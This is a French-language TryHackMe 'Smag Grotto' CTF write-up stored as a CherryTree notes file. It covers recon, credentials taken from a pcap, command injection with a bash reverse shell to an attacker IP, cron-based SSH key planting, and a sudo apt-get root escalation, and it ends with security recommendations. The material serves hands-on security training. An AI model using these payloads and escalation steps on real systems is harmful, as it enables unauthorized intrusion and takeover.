@@ -1,0 +1,151 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="9" master_id="0" name="smaggrotto" prog_lang="markdown" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1786385832" ts_lastsave="1786388935">
+    <rich_text>🚩 Writeup TryHackMe — Smag Grotto
+
+    Plateforme : TryHackMe
+
+    OS : Linux
+
+    Difficulté : Facile
+
+    Objectifs : user.txt &amp; root.txt
+
+🔍 1. Reconnaissance
+Scan de ports (Nmap)
+
+Un scan initial des ports montre deux services actifs sur la cible :
+Bash
+
+nmap -sC -sV -oA nmap/smag &lt;IP_CIBLE&gt;
+
+Port	Service	Description
+22/tcp	SSH	OpenSSH
+80/tcp	HTTP	Apache Web Server
+Énumération Web (dirsearch)
+
+Un fuzzing de répertoires sur le serveur HTTP avec dirsearch permet de découvrir un dossier accessible /mail :
+Bash
+
+dirsearch -u http://&lt;IP_CIBLE&gt;/ -e php,txt,html
+
+En naviguant sur http://&lt;IP_CIBLE&gt;/mail, nous trouvons un message réseau accompagné d'un fichier de capture de trafic (dHJhY2Uy.pcap) :
+
+    "Due to the exponential growth of our platform... we need to migrate everything from our current 192.168.33.0/24 network to the 10.10.0.0/8 network.  
+
+The previous engineer had done some network traces so hopefully they will give you an idea of how our systems are addressed.  
+
+dHJhY2Uy.pcap"  
+
+Informations extraites du mail :
+
+    Adresses e-mails : netadmin@smag.thm, uzi@smag.thm, jake@smag.thm
+
+    Mention d'un problème lié au composant email2web.
+
+⚡ 2. Armement &amp; Accès Initial
+Analyse du fichier PCAP (Wireshark)
+
+En ouvrant dHJhY2Uy.pcap dans Wireshark et en filtrant sur le protocole http, nous inspectons une requête POST adressée au formulaire /login. Les identifiants de connexion y apparaissent en clair :
+
+    Identifiants trouvés : helpdesk : cH4nG3M3_n0w
+
+    Vhost identifié : development.smag.thm
+
+Configuration du Virtual Host
+
+Pour accéder au sous-domaine de développement, nous l'ajoutons à notre fichier /etc/hosts :
+Bash
+
+echo "&lt;IP_CIBLE&gt; development.smag.thm" | sudo tee -a /etc/hosts
+
+Exploitation RCE &amp; Reverse Shell
+
+    Connexion sur [http://development.smag.thm/login.php](http://development.smag.thm/login.php) avec les identifiants helpdesk.
+
+    Redirection vers [http://development.smag.thm/admin.php](http://development.smag.thm/admin.php), qui présente un formulaire d'exécution de commandes système (Command Injection / RCE via email2web).
+
+    Préparation d'un listener Netcat sur la machine d'attaque :
+    Bash
+
+nc -lvnp 4444
+
+Injection du payload reverse shell Bash dans le formulaire :
+Bash
+
+    bash -c 'exec bash -i &amp;&gt;/dev/tcp/&lt;IP_KALI&gt;/4444 &lt;&amp;1'
+
+Accès obtenu : Shell initial en tant que www-data.
+
+(Le fichier /home/jake/user.txt est visible, mais inaccessible avec les droits de www-data).
+🔄 3. Mouvement Latéral (www-data ➔ jake)
+Énumération locale
+
+En analysant les tâches planifiées du système (cat /etc/crontab), nous découvrons un Cron Job exécuté chaque minute avec les privilèges root :
+Plaintext
+
+* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys
+
+Exploitation de la tâche Cron
+
+L'utilisateur www-data possède des droits d'écriture sur le fichier /opt/.backups/jake_id_rsa.pub.backup. Nous pouvons donc y remplacer la clé publique par la nôtre.
+
+    Génération d'une paire de clés SSH (sur Kali) :
+    Bash
+
+ssh-keygen -t rsa -b 4096 -f id_rsa_ctf
+
+Injection de notre clé publique sur la cible :
+Bash
+
+echo "&lt;CONTENU_DE_id_rsa_ctf.pub&gt;" &gt; /opt/.backups/jake_id_rsa.pub.backup
+
+Connexion SSH :
+
+Après une minute (temps d'exécution du Cron), notre clé est automatiquement copiée dans /home/jake/.ssh/authorized_keys. Il ne reste plus qu'à se connecter :
+Bash
+
+    ssh -i id_rsa_ctf jake@&lt;IP_CIBLE&gt;
+
+Accès obtenu : Session SSH ouverte en tant que jake.
+Bash
+
+cat /home/jake/user.txt
+
+🚀 4. Élévation de Privilèges (jake ➔ root)
+Inspection des privilèges Sudo
+
+L'inspection de l'historique Bash (.bash_history) et la vérification des droits sudo (sudo -l) révèlent la règle suivante :
+Plaintext
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+
+Exploitation GTFOBins (apt-get)
+
+Bien que la commande classique sudo apt-get changelog tente de contacter Internet (et échoue sur une machine CTF isolée), nous pouvons utiliser l'option de configuration d'APT pour exécuter un shell avant l'exécution de la mise à jour :
+Bash
+
+sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"
+
+Obtention du shell Root :
+Bash
+
+whoami
+# root
+
+cat /root/root.txt
+
+🎯 5. Conclusion &amp; Recommandations
+
+Ce laboratoire met en évidence plusieurs failles majeures dans la chaîne de sécurité d'un système :
+
+    Divulgation d'informations sensibles (Information Disclosure) : Ne jamais stocker de fichiers de capture réseau (.pcap) ou de journaux contenant des identifiants en clair dans des répertoires Web accessibles.
+
+    Tâches automatisées non sécurisées : Une tâche Cron exécutée par root ne doit jamais s'appuyer sur des fichiers modifiables par des utilisateurs non privilégiés (www-data).
+
+    Gestion des accès SSH : L'écriture dans authorized_keys doit être strictement contrôlée et restreinte aux propriétaires légitimes.
+
+    Principe du moindre privilège (PoLP) : Limiter l'usage de sudo sur des binaires comme apt-get, qui permettent une exécution de commande arbitraire (Arbitrary Command</rich_text>
+  </node>
+</cherrytree>
